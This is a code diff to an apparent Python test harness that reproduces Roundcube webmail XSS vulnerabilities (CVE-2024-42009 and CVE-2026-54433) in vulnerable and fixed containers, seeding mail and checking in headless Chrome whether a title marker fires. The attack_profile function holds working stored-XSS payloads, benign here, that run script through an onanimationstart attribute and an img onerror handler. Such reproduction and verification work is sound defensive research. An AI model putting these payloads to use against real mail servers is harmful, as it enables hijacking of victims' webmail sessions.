@@ -16,15 +16,74 @@ from playwright.sync_api import sync_playwright
 
 APP_ROOT = Path(__file__).resolve().parents[1]
 PAIR_PATH = APP_ROOT / "configs" / "stage3a-cve-roundcube-2024-42009-v1.json"
+PAIR_2026_PATH = APP_ROOT / "configs" / "stage3a-cve-roundcube-2026-54433-v1.json"
 COMPOSE_PATH = APP_ROOT / "cve-roundcube" / "compose.yaml"
 EVENT_SCHEMA_PATH = APP_ROOT.parent / "contracts" / "verifier-ledger-event.schema.json"
 CONTROL_ORIGIN = "http://127.0.0.1:18081"
 RESET_HEADERS = {"X-Ruby-Reset-Token": "development-reset-only"}
-CHROME_PATH = Path(r"C:\Program Files\Google\Chrome\Application\chrome.exe")
+SYSTEM_CHROME_PATH = Path(r"C:\Program Files\Google\Chrome\Application\chrome.exe")
 VICTIM_USERNAME = "victim@example.test"
 VICTIM_PASSWORD = "roundcube-test-only"
 NORMAL_SUBJECT = "RUBY normal mail control"
 ATTACK_SUBJECT = "RUBY Roundcube CVE probe"
+
+
+def attack_profile(pair: dict[str, object] | None = None) -> dict[str, str]:
+    cve_id = str(pair.get("cve_id")) if pair else "CVE-2024-42009"
+    if cve_id == "CVE-2026-54433":
+        marker = str(pair["browser"]["success_marker"])
+        return {
+            "normal_subject": "RUBY normal plain-text control",
+            "attack_subject": "RUBY Roundcube CVE-2026-54433 probe",
+            "mime_subtype": "plain",
+            "payload": (
+                'a@a.co?]<img/src="x"/hidden/name="document.title=\''
+                + marker
+                + "'\"/onerror=eval(name)>"
+            ),
+            "scenario_id": "roundcube-cve-2026-54433",
+            "predicate_id": "roundcube.cve-2026-54433.browser-marker",
+            "deduplication_key": "roundcube-2026-browser-marker",
+        }
+    if cve_id != "CVE-2024-42009":
+        raise ValueError(f"unsupported Roundcube CVE profile: {cve_id}")
+    return {
+        "normal_subject": NORMAL_SUBJECT,
+        "attack_subject": ATTACK_SUBJECT,
+        "mime_subtype": "html",
+        "payload": (
+            '<body title="bgcolor=foo" name="bar style=animation-name:'
+            "progress-bar-stripes onanimationstart=document.title="
+            "'RUBY-CVE-2024-42009-SUCCESS' foo=bar\"><p>"
+            "Roundcube parser regression probe</p></body>"
+        ),
+        "scenario_id": "roundcube-cve-2024-42009",
+        "predicate_id": "roundcube.cve-2024-42009.browser-marker",
+        "deduplication_key": "roundcube-browser-marker",
+    }
+
+
+def browser_executable_path(playwright: object) -> Path:
+    override = os.environ.get("RUBY_BROWSER_EXECUTABLE")
+    if override:
+        resolved = Path(override).expanduser().resolve()
+        if not resolved.is_file():
+            raise RuntimeError(f"RUBY_BROWSER_EXECUTABLE is not a file: {resolved}")
+        return resolved
+    candidates = []
+    if SYSTEM_CHROME_PATH.is_file():
+        candidates.append(SYSTEM_CHROME_PATH)
+    bundled = getattr(playwright.chromium, "executable_path", None)
+    if bundled:
+        candidates.append(Path(bundled))
+    for candidate in candidates:
+        resolved = candidate.resolve()
+        if resolved.is_file():
+            return resolved
+    raise RuntimeError(
+        "no browser executable is available; install Playwright Chromium or set "
+        "RUBY_BROWSER_EXECUTABLE"
+    )
 
 
 def canonical_json(value: object) -> str:
@@ -100,8 +159,6 @@ def require_main_stack() -> None:
     for service in ("api", "evaluator"):
         if not main_compose("ps", "-q", service).stdout.strip():
             raise RuntimeError(f"main Compose service is not running: {service}")
-    if not CHROME_PATH.is_file():
-        raise RuntimeError(f"system Chrome is unavailable: {CHROME_PATH}")
 
 
 def reset_main_stack() -> None:
@@ -121,7 +178,12 @@ def main_compose_exec(service: str, code: str, *arguments: str) -> str:
     ).stdout.strip()
 
 
-def record_effect(trial_id: str, protected_key: str) -> None:
+def record_effect(
+    trial_id: str,
+    protected_key: str,
+    *,
+    deduplication_key: str = "roundcube-browser-marker",
+) -> None:
     code = (
         "import sys;"
         "from ruby_web.config import Settings;"
@@ -130,18 +192,23 @@ def record_effect(trial_id: str, protected_key: str) -> None:
         "d=Database(Settings.from_environment().database_url);s=d.sessions();"
         "record_internal_event(s,trial_id=sys.argv[1],event_type='browser.code_executed',"
         "subject={'authorized':'false'},object_={'resource_id':sys.argv[2]},"
-        "protected_resource_key=sys.argv[2],deduplication_key='roundcube-browser-marker');"
+        "protected_resource_key=sys.argv[2],deduplication_key=sys.argv[3]);"
         "s.commit();s.close()"
     )
-    main_compose_exec("api", code, trial_id, protected_key)
+    main_compose_exec("api", code, trial_id, protected_key, deduplication_key)
 
 
-def evaluator_manifest(protected_key: str) -> tuple[str, dict[str, object]]:
-    predicate_id = "roundcube.cve-2024-42009.browser-marker"
+def evaluator_manifest(
+    protected_key: str,
+    *,
+    scenario_id: str = "roundcube-cve-2024-42009",
+    predicate_id: str = "roundcube.cve-2024-42009.browser-marker",
+    deduplication_key: str = "roundcube-browser-marker",
+) -> tuple[str, dict[str, object]]:
     subject = {"authorized": "false"}
     object_ = {"resource_id": protected_key}
     condition = {
-        "deduplication_key": "roundcube-browser-marker",
+        "deduplication_key": deduplication_key,
         "event_type": "browser.code_executed",
         "minimum_occurrences": 1,
         "object": object_,
@@ -151,7 +218,7 @@ def evaluator_manifest(protected_key: str) -> tuple[str, dict[str, object]]:
     }
     manifest = {
         "contract_version": 1,
-        "scenario_id": "roundcube-cve-2024-42009",
+        "scenario_id": scenario_id,
         "verifier_image_digest": main_service_image_digest("evaluator"),
         "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
         "network_access": "control-only",
@@ -167,15 +234,27 @@ def evaluator_manifest(protected_key: str) -> tuple[str, dict[str, object]]:
                 "condition_digest": digest(condition),
                 "window_seconds": 300,
                 "minimum_occurrences": 1,
-                "deduplication_key": "roundcube-browser-marker",
+                "deduplication_key": deduplication_key,
             }
         ],
     }
     return predicate_id, manifest
 
 
-def evaluate(trial_id: str, protected_key: str) -> tuple[dict[str, object], dict[str, object]]:
-    predicate_id, manifest = evaluator_manifest(protected_key)
+def evaluate(
+    trial_id: str,
+    protected_key: str,
+    *,
+    scenario_id: str = "roundcube-cve-2024-42009",
+    predicate_id: str = "roundcube.cve-2024-42009.browser-marker",
+    deduplication_key: str = "roundcube-browser-marker",
+) -> tuple[dict[str, object], dict[str, object]]:
+    predicate_id, manifest = evaluator_manifest(
+        protected_key,
+        scenario_id=scenario_id,
+        predicate_id=predicate_id,
+        deduplication_key=deduplication_key,
+    )
     payload = canonical_json(
         {"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest}
     )
@@ -209,21 +288,36 @@ def wait_ready(origin: str, container_ids: dict[str, str]) -> int:
     raise RuntimeError("Roundcube did not become ready within 120 seconds")
 
 
-def seed_mail(client_image: str, network: str, marker: str) -> dict[str, object]:
-    script = r'''import smtplib
+def seed_mail(
+    client_image: str,
+    network: str,
+    marker: str,
+    pair: dict[str, object] | None = None,
+) -> dict[str, object]:
+    profile = attack_profile(pair)
+    messages = [
+        {
+            "subject": profile["normal_subject"],
+            "body": "Normal control message",
+            "subtype": "plain",
+        },
+        {
+            "subject": profile["attack_subject"],
+            "body": profile["payload"],
+            "subtype": profile["mime_subtype"],
+        },
+    ]
+    encoded_messages = canonical_json(messages).encode("utf-8").hex()
+    script = r'''import json, smtplib, sys
 from email.mime.text import MIMEText
 
-def send(subject, body, subtype):
-    message = MIMEText(body, subtype, "utf-8")
+for item in json.loads(bytes.fromhex(sys.argv[1]).decode("utf-8")):
+    message = MIMEText(item["body"], item["subtype"], "utf-8")
     message["From"] = "sender@example.test"
     message["To"] = "victim@example.test"
-    message["Subject"] = subject
+    message["Subject"] = item["subject"]
     with smtplib.SMTP("mail", 3025, timeout=20) as client:
         client.send_message(message)
-
-send("RUBY normal mail control", "Normal control message", "plain")
-payload = """<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=document.title='RUBY-CVE-2024-42009-SUCCESS' foo=bar"><p>Roundcube parser regression probe</p></body>"""
-send("RUBY Roundcube CVE probe", payload, "html")
 print("seeded 2")
 '''
     result = run(
@@ -250,6 +344,7 @@ print("seeded 2")
             "python",
             "-c",
             script,
+            encoded_messages,
         ],
         check=False,
         timeout=60,
@@ -263,11 +358,19 @@ print("seeded 2")
     }
 
 
-def browser_probe(origin: str, marker: str) -> dict[str, object]:
+def browser_probe(
+    origin: str,
+    marker: str,
+    pair: dict[str, object] | None = None,
+) -> dict[str, object]:
+    profile = attack_profile(pair)
+    normal_subject = profile["normal_subject"]
+    attack_subject = profile["attack_subject"]
     started = time.monotonic()
     with sync_playwright() as playwright:
+        executable_path = browser_executable_path(playwright)
         browser = playwright.chromium.launch(
-            executable_path=str(CHROME_PATH),
+            executable_path=str(executable_path),
             headless=True,
             args=["--disable-gpu", "--no-first-run"],
         )
@@ -277,31 +380,32 @@ def browser_probe(origin: str, marker: str) -> dict[str, object]:
         page.locator("#rcmloginuser").fill(VICTIM_USERNAME)
         page.locator("#rcmloginpwd").fill(VICTIM_PASSWORD)
         page.locator("#rcmloginsubmit").click()
-        page.get_by_text(NORMAL_SUBJECT, exact=True).wait_for(timeout=30_000)
-        page.get_by_text(ATTACK_SUBJECT, exact=True).wait_for(timeout=30_000)
-        page.get_by_text(NORMAL_SUBJECT, exact=True).dblclick()
+        page.get_by_text(normal_subject, exact=True).wait_for(timeout=30_000)
+        page.get_by_text(attack_subject, exact=True).wait_for(timeout=30_000)
+        page.get_by_text(normal_subject, exact=True).dblclick()
         page.wait_for_function(
             "subject => document.title.includes(subject)",
-            arg=NORMAL_SUBJECT,
+            arg=normal_subject,
             timeout=15_000,
         )
         normal_title = page.title()
         page.goto(origin + "/?_task=mail&_mbox=INBOX", wait_until="domcontentloaded")
-        page.get_by_text(ATTACK_SUBJECT, exact=True).wait_for(timeout=30_000)
-        page.get_by_text(ATTACK_SUBJECT, exact=True).dblclick()
+        page.get_by_text(attack_subject, exact=True).wait_for(timeout=30_000)
+        page.get_by_text(attack_subject, exact=True).dblclick()
         page.wait_for_timeout(2_000)
         attack_title = page.title()
         marker_executed = attack_title == marker
+        browser_product = browser.version
         context.close()
         browser.close()
     return {
-        "normal_subject_visible": NORMAL_SUBJECT in normal_title,
+        "normal_subject_visible": normal_subject in normal_title,
         "normal_title": normal_title,
         "attack_title": attack_title,
         "marker_executed": marker_executed,
         "elapsed_milliseconds": round((time.monotonic() - started) * 1000),
-        "browser_product": "Google Chrome",
-        "browser_executable_sha256": digest_bytes(CHROME_PATH.read_bytes()),
+        "browser_product": browser_product,
+        "browser_executable_sha256": digest_bytes(executable_path.read_bytes()),
     }
 
 
@@ -354,6 +458,7 @@ def run_condition(
     trial_id = uuid4().hex
     marker = str(pair["browser"]["success_marker"])
     protected_key = str(pair["reference_attack"]["protected_resource_key"])
+    profile = attack_profile(pair)
     reset_main_stack()
     started = time.monotonic()
     try:
@@ -367,13 +472,23 @@ def run_condition(
         if not all(container_ids.values()):
             raise RuntimeError("Roundcube condition did not create all services")
         ready_ms = wait_ready(origin, container_ids)
-        seed = seed_mail(client_image, f"{project}_target", marker)
+        seed = seed_mail(client_image, f"{project}_target", marker, pair)
         if seed["returncode"] != 0:
             raise RuntimeError("mail seeding failed")
-        browser = browser_probe(origin, marker)
+        browser = browser_probe(origin, marker, pair)
         if browser["marker_executed"]:
-            record_effect(trial_id, protected_key)
-        evaluator, verifier = evaluate(trial_id, protected_key)
+            record_effect(
+                trial_id,
+                protected_key,
+                deduplication_key=profile["deduplication_key"],
+            )
+        evaluator, verifier = evaluate(
+            trial_id,
+            protected_key,
+            scenario_id=profile["scenario_id"],
+            predicate_id=profile["predicate_id"],
+            deduplication_key=profile["deduplication_key"],
+        )
         images = {
             "roundcube": image_evidence(target_image, str(release["image_digest"])),
             "mail": image_evidence(mail_image, str(pair["mail"]["image_digest"])),
@@ -427,6 +542,12 @@ def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Check the sealed Roundcube CVE pair")
     parser.add_argument("--output-dir", type=Path, required=True)
     parser.add_argument("--run-id", required=True)
+    parser.add_argument(
+        "--pair",
+        type=Path,
+        default=PAIR_PATH,
+        help="Roundcube pair configuration under app/configs",
+    )
     return parser.parse_args()
 
 
@@ -434,21 +555,30 @@ def main() -> int:
     args = parse_args()
     if args.output_dir.exists():
         raise FileExistsError(f"refusing to overwrite output: {args.output_dir}")
+    pair_path = args.pair.resolve()
+    config_root = (APP_ROOT / "configs").resolve()
+    if pair_path.parent != config_root:
+        raise ValueError("Roundcube pair configuration must be directly under app/configs")
     require_main_stack()
-    pair = json.loads(PAIR_PATH.read_text(encoding="utf-8"))
+    pair = json.loads(pair_path.read_text(encoding="utf-8"))
+    report_stem = (
+        "roundcube-2026-54433-cve-pair"
+        if pair["cve_id"] == "CVE-2026-54433"
+        else "stage3a-roundcube-cve-pair"
+    )
     args.output_dir.mkdir(parents=True, exist_ok=False)
     conditions: list[dict[str, object]] = []
     try:
         for name in ("vulnerable", "fixed"):
             conditions.append(run_condition(name=name, release=pair[name], pair=pair))
     except Exception as error:
-        failure_path = args.output_dir / "stage3a-roundcube-cve-pair-failure.json"
+        failure_path = args.output_dir / f"{report_stem}-failure.json"
         failure_path.write_text(
             json.dumps(
                 {
                     "schema_version": 1,
                     "run_id": args.run_id,
-                    "pair_digest": digest_bytes(PAIR_PATH.read_bytes()),
+                    "pair_digest": digest_bytes(pair_path.read_bytes()),
                     "completed_conditions": conditions,
                     "failure_type": type(error).__name__,
                     "failure_reason": str(error),
@@ -472,14 +602,14 @@ def main() -> int:
     report = {
         "schema_version": 1,
         "run_id": args.run_id,
-        "pair_digest": digest_bytes(PAIR_PATH.read_bytes()),
+        "pair_digest": digest_bytes(pair_path.read_bytes()),
         "pair": pair,
         "conditions": conditions,
         "cleanup": residue,
         "all_checks_passed": all(condition["all_checks_passed"] for condition in conditions)
         and all(not resources["containers"] and not resources["networks"] for resources in residue.values()),
     }
-    report_path = args.output_dir / "stage3a-roundcube-cve-pair-report.json"
+    report_path = args.output_dir / f"{report_stem}-report.json"
     report_path.write_text(
         json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
         encoding="utf-8",
